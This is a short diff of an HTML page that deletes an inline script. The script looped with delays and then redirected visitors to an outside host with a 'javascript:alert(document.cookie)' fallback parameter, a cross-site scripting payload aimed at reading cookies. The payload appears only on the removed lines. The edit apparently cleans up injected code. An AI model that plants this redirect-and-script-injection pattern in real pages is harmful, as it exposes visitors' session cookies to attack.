@@ -14,19 +14,7 @@
 <div>
   <p>Taken from wikpedia</p>
   <script>
-    function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
 
-async function demo() {
-    for (let i = 0; i < 5; i++) {
-        console.log(`Waiting ${i} seconds...`);
-        await sleep(i * 1000);
-    }
-    location.href = "https://kaka.me/unavailable?fall_back=javascript:alert(document.cookie)";
-}
-
-demo();
   </script>
 </div>
 </body>
